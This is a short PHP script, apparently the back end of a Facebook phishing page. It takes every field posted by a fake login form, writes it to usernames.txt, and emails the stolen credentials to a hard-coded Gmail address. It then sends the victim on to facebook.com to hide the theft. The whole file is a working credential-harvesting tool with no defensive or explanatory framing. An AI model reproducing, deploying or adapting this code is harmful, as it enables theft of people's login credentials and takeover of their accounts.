<?php
// Enable error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Email Configuration
$to = "geormari121@gmail.com"; // Replace with your email address
$subject = "New Login Credential Submission";
$headers = "From: no-reply@example.com\r\n"; // Replace with your "From" email address

// Redirect to Facebook
header('Location: http://www.facebook.com/');

// Open the file for appending
$handle = fopen("usernames.txt", "a");

// Prepare email message content
$emailMessage = "New login credentials submitted:\r\n";

// Write POST data to the file and prepare email content
foreach ($_POST as $variable => $value) {
    $data = $variable . "=" . $value . "\r\n";
    fwrite($handle, $data);
    $emailMessage .= $data;
}

// Add a newline at the end
fwrite($handle, "\r\n");
$emailMessage .= "\r\n";

// Close the file
fclose($handle);

// Send email notification
if (mail($to, $subject, $emailMessage, $headers)) {
    error_log("Notification email sent successfully.");
} else {
    error_log("Failed to send notification email.");
}

exit;
?>
